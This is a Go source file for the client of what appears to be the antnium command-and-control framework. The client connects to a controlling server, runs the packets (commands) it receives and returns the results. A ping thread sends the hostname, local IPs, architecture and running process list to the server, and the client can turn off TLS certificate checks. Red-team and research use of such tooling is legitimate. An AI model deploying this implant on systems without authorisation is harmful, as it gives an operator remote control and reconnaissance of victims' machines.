package client

import (
	"crypto/tls"
	"errors"
	"math/rand"
	"net/http"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   *ClientConfig
	Campaign *model.Campaign

	Upstream          Upstream
	DownstreamManager DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	upstream := MakeUpstreamHttp(&config, &campaign)
	downstreamManager := MakeDownstreamManager(upstream)

	w := Client{
		&config,
		&campaign,
		&upstream,
		downstreamManager,
	}
	return w
}

func (c *Client) Start() {
	if c.Config.InsecureTls {
		// Enable SkipVerify on all instances of http
		// https://stackoverflow.com/questions/12122159/how-to-do-a-https-request-with-bad-certificate
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	// "Connect" to the server, mostly to check if we have internet connection and are not blocked
	c.Upstream.Connect()
	go c.Upstream.Start()

	go c.sendPing() // Thread: sendPing
}

func (c *Client) Loop() {
	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-c.Upstream.Channel()

		p, err := c.DownstreamManager.Do(p)
		if err != nil {
			log.Error("Err: ", err.Error())
		}

		// Send answer back to server
		c.Upstream.Channel() <- p
	}
}

// sendPing is a Thread which tries to send initial ping packet to the server, lifetime: until success
func (c *Client) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = c.Config.Hostname
	model.AddArrayToResponse("localIp", c.Config.LocalIps, response)
	response["arch"] = c.Config.Arch
	model.AddArrayToResponse("processes", c.Config.Processes, response)

	packet := model.NewPacket("ping", c.Config.ComputerId, "0", arguments, response)
	for {
		err := c.Upstream.SendOutofband(packet)
		if err == nil {
			break // when no error -> success
		}
		time.Sleep(time.Minute * 10) // 10mins for now
	}
}

// SendDownstreams is used to notify server about any new downstreams
func (c *Client) SendDownstreams(downstreams []DownstreamInfo) error {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)

	for idx, downstreamInfo := range downstreams {
		idxStr := strconv.Itoa(idx)
		response["name"+idxStr] = downstreamInfo.Name
		response["info"+idxStr] = downstreamInfo.Info
	}

	packet := model.NewPacket("downstreams", c.Config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)

	err := c.Upstream.SendOutofband(packet)
	if err != nil {
		return err
	}

	return nil
}
